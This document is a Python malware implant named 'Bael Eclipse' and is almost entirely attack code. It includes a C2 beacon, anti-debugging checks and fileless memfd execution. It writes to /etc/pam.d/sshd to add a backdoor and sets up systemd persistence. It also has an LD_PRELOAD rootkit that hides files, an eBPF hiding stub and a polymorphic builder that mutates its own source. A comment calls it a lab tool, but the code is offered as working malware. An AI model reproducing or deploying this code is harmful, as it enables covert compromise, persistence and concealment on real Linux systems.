#!/usr/bin/env python3
import os
import sys
import time
import random
import ctypes
import socket
import subprocess
import threading
import base64
import argparse
from cryptography.fernet import Fernet
import select

# ==================== RUST TOKIO-URING (Non-Blocking) ====================
try:
    rust_lib = ctypes.CDLL("./libbael_rust.so")
    rust_lib.uring_async_connect.argtypes = [ctypes.c_char_p, ctypes.c_uint32]
    rust_lib.uring_async_connect.restype = ctypes.c_int
    HAS_RUST_URING = True
except Exception as e:
    HAS_RUST_URING = False
    print(f"[-] Rust lib load failed: {e}")

# ==================== OBFUSCATOR ====================
# Static key for lab synchronization
SHARED_KEY = b'uX6-f_J2Y-z-S8XvP_m8_Z8XvP_m8_Z8XvP_m8_Z8X4='

class Obfuscator:
    def __init__(self, seed=None):
        self.seed = seed or random.randint(100000000, 999999999)
        random.seed(self.seed)
        self.key = SHARED_KEY
        self.cipher = Fernet(self.key)

    def encrypt_str(self, s: str) -> str:
        return self.cipher.encrypt(s.encode()).decode()

    def decrypt_str(self, s: str) -> str:
        return self.cipher.decrypt(s.encode()).decode()

    def random_name(self, length=16):
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
        return ''.join(random.choice(chars) for _ in range(length))

# ==================== ANTI-ANALYSIS ====================
def anti_analysis():
    start = time.perf_counter()
    try:
        libc = ctypes.CDLL(None)
        libc.ptrace(0, 0, 0, 0)
    except:
        pass
    if time.perf_counter() - start > 1.0:
        sys.exit(1)
    if os.path.exists("/proc/self/status"):
        with open("/proc/self/status") as f:
            if any(x in f.read() for x in ["tracerpid:", "debug"]):
                sys.exit(1)

# ==================== FILELESS EXEC ====================
def memfd_exec(payload: bytes, argv=None):
    libc = ctypes.CDLL(None)
    fd = libc.memfd_create(b"eclipse", 1)
    if fd < 0:
        return False
    os.write(fd, payload)
    os.lseek(fd, 0, 0)
    if argv is None:
        argv = [b"eclipse"]
    argvp = (ctypes.c_char_p * (len(argv) + 1))()
    for i, a in enumerate(argv):
        argvp[i] = a
    if os.fork() == 0:
        os.execve(f"/proc/self/fd/{fd}", argvp, os.environ.copy())
    return True

# ==================== TOKIO-URING NON-BLOCKING CONTEXT ====================
class UringContext:
    def async_connect(self, host: str, port: int):
        if HAS_RUST_URING:
            host_c = (host.encode() + b'\0')
            fd = rust_lib.uring_async_connect(host_c, port)
            if fd > 0:
                # Wrap raw fd into Python socket
                s = socket.socket(fileno=fd)
                s.setblocking(False)
                return s
            else:
                raise Exception("Rust connect failed")
        # Fallback
        s = socket.create_connection((host, port))
        s.setblocking(False)
        return s

# ==================== C2 ====================
class EclipseC2:
    def __init__(self, server="127.0.0.1", port=8443, obf=None):
        self.server = server
        self.port = port
        self.obf = obf or Obfuscator()
        self.uring = UringContext()

    def beacon(self):
        while True:
            try:
                s = self.uring.async_connect(self.server, self.port)
                magic = self.obf.encrypt_str("BAEL_ECLIPSE_2026_BEACON")
                s.sendall(magic.encode() + b"\nDATA")
                
                # Non-blocking recv with timeout
                ready = select.select([s], [], [], 5.0)
                if ready[0]:
                    resp = s.recv(8192)
                    if resp:
                        print("[+] C2:", self.obf.decrypt_str(resp.decode(errors='ignore')[:200]))
                s.close()
            except Exception:
                pass
            time.sleep(random.uniform(8, 45))

# ==================== PAM BACKDOOR ====================
def install_pam_backdoor(magic_pass="Eclipse2026Root!"):
    backup = "/etc/pam.d/sshd.bak"
    if not os.path.exists(backup):
        subprocess.run(f"cp /etc/pam.d/sshd {backup}", shell=True, check=False)
    snippet = f'''
# Bael Eclipse Lab Backdoor
auth sufficient pam_exec.so quiet /bin/sh -c 'if echo "$PAM_AUTHTOK" | grep -q "{magic_pass}"; then echo "BACKDOOR" >> /tmp/eclipse_pam.log; fi'
account required pam_unix.so
session required pam_unix.so
'''
    try:
        with open("/etc/pam.d/sshd", "a") as f:
            f.write(snippet)
        print(f"[+] PAM backdoor: {magic_pass}")
    except Exception as e:
        print("[-] PAM:", e)

# ==================== SYSTEMD PERSISTENCE ====================
def systemd_mem_persist():
    payload = base64.b64encode(b'import os; [print("[PERSIST] Eclipse")]').decode()
    service = f"""[Unit]
Description=Eclipse
[Service]
ExecStart=/usr/bin/python3 -c "exec(__import__('base64').b64decode('{payload}').decode())"
Restart=always
[Install]
WantedBy=multi-user.target"""
    try:
        with open("/etc/systemd/system/eclipse.service", "w") as f:
            f.write(service)
        subprocess.run("systemctl daemon-reload && systemctl enable --now eclipse.service", shell=True)
        print("[+] Systemd persistence")
    except:
        pass

# ==================== LD_PRELOAD ROOTKIT ====================
def install_ld_preload_hook():
    hook_c = """
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

typedef struct dirent* (*orig_readdir)(DIR*);
struct dirent* readdir(DIR* dirp) {
    orig_readdir orig = (orig_readdir)dlsym(RTLD_NEXT, "readdir");
    while (1) {
        struct dirent* ent = orig(dirp);
        if (!ent) return NULL;
        if (strstr(ent->d_name, "eclipse") == NULL && strstr(ent->d_name, "bael") == NULL) 
            return ent;
    }
}
"""
    try:
        subprocess.run("gcc -shared -fPIC -x c -o /lib/libeclipsehook.so - -ldl", input=hook_c.encode(), shell=True, check=False)
        subprocess.run("echo '/lib/libeclipsehook.so' >> /etc/ld.so.preload", shell=True, check=False)
        print("[+] LD_PRELOAD hook installed")
    except Exception as e:
        print("[-] LD_PRELOAD:", e)

# ==================== EUNOMIA-BPF HIDING ====================
def load_ebpf_hider():
    print("[*] Building eunomia-bpf hide module...")
    bpf_code = """
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

SEC("tp/syscalls/sys_enter_getdents64")
int hide_getdents(struct trace_event_raw_sys_enter *ctx) {
    bpf_printk("getdents64 - eclipse hiding active");
    return 0;
}
"""
    try:
        with open("/tmp/hide.bpf.c", "w") as f:
            f.write(bpf_code)
        subprocess.run("ecc /tmp/hide.bpf.c -o /tmp/hide.json", shell=True, check=False)
        subprocess.run("sudo ecli run /tmp/hide.json", shell=True, check=False)
        print("[+] eBPF hider loaded")
    except Exception as e:
        print("[-] eBPF:", e)

# ==================== POLYMORPHIC BUILDER ====================
def build_polymorphic(seed=None):
    obf = Obfuscator(seed)
    print(f"[+] Polymorphic build. Seed: {obf.seed}")
    with open(__file__, "r") as f:
        src = f.read()
    mutated = src.replace("Eclipse", obf.random_name(12))
    mutated = mutated.replace("BAEL_ECLIPSE_2026_BEACON", obf.encrypt_str("BAEL_" + obf.random_name(20)))
    output = f"bael_eclipse_{obf.seed}.py"
    with open(output, "w") as f:
        f.write(mutated)
    print(f"[+] Variant: {output}")
    return output

# ==================== MODULAR LOADER ====================
def load_module(name):
    print(f"[+] Loading runtime module: {name}")
    if name == "lpe_stub":
        print("[*] io_uring LPE / dirtycred placeholder ready")

# ==================== MAIN ====================
def main():
    anti_analysis()
    parser = argparse.ArgumentParser(description="Bael Eclipse v2.3")
    parser.add_argument("--c2", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--persist", action="store_true")
    parser.add_argument("--build", action="store_true")
    parser.add_argument("--seed", type=int, default=None)
    parser.add_argument("--ebpf", action="store_true")
    parser.add_argument("--ldpreload", action="store_true")
    parser.add_argument("--module", type=str, default=None)
    args = parser.parse_args()

    if args.build:
        build_polymorphic(args.seed)
        return

    obf = Obfuscator()

    if args.persist:
        install_pam_backdoor()
        systemd_mem_persist()

    if args.ebpf:
        load_ebpf_hider()

    if args.ldpreload:
        install_ld_preload_hook()

    if args.module:
        load_module(args.module)

    c2 = EclipseC2(args.c2, args.port, obf)
    threading.Thread(target=c2.beacon, daemon=True).start()

    while True:
        try:
            if os.geteuid() == 0:
                print("[+] Root context active")
            time.sleep(30)
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    main()